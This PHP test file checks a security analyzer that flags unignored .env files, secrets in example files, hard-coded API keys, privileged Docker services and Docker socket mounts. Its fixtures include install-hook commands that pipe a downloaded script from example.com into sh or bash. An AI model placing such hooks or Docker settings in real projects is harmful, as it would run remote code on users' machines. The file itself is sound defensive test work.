<?php

use DevDoctor\Modules\Security\SecurityAnalyzer;
use DevDoctor\Modules\Security\SecurityOptions;

function securityFixture(array $files): string
{
    $path = sys_get_temp_dir().'/devdoctor-security-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports ready security posture when no issues are found', function () {
    $issues = (new SecurityAnalyzer)->analyze(new SecurityOptions(path: securityFixture([
        '.gitignore' => ".env\n",
    ])));

    expect($issues->all()[0]->code)->toBe('DD_SECURITY_READY');
});

it('reports env ignore gaps and secrets in example files', function () {
    $issues = (new SecurityAnalyzer)->analyze(new SecurityOptions(path: securityFixture([
        '.gitignore' => "vendor\n",
        '.env.example' => "PAYMENT_SECRET=abcdefghijklmnopqrstuvwxyz1234567890abcdefgh\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_SECURITY_ENV_NOT_IGNORED')
        ->and($codes)->toContain('DD_SECURITY_SECRET_IN_EXAMPLE');
});

it('reports risky scripts and compose settings', function () {
    $issues = (new SecurityAnalyzer)->analyze(new SecurityOptions(path: securityFixture([
        'composer.json' => '{"scripts":{"post-install-cmd":"curl https://example.com/a.sh | sh"}}',
        'package.json' => '{"scripts":{"postinstall":"wget https://example.com/a.sh | bash"}}',
        'compose.yml' => "services:\n  app:\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_SECURITY_RISKY_COMPOSER_SCRIPT')
        ->and($codes)->toContain('DD_SECURITY_RISKY_PACKAGE_SCRIPT')
        ->and($codes)->toContain('DD_SECURITY_DOCKER_PRIVILEGED')
        ->and($codes)->toContain('DD_SECURITY_DOCKER_SOCKET_MOUNT');
});

it('reports hard coded secret patterns', function () {
    $issues = (new SecurityAnalyzer)->analyze(new SecurityOptions(path: securityFixture([
        'config/app.php' => "<?php\nreturn ['api_key' => 'abcdefghijklmnopqrstuvwxyz1234567890'];",
    ])));

    expect(array_map(static fn ($issue): string => $issue->code, $issues->all()))
        ->toContain('DD_SECURITY_SECRET_PATTERN');
});
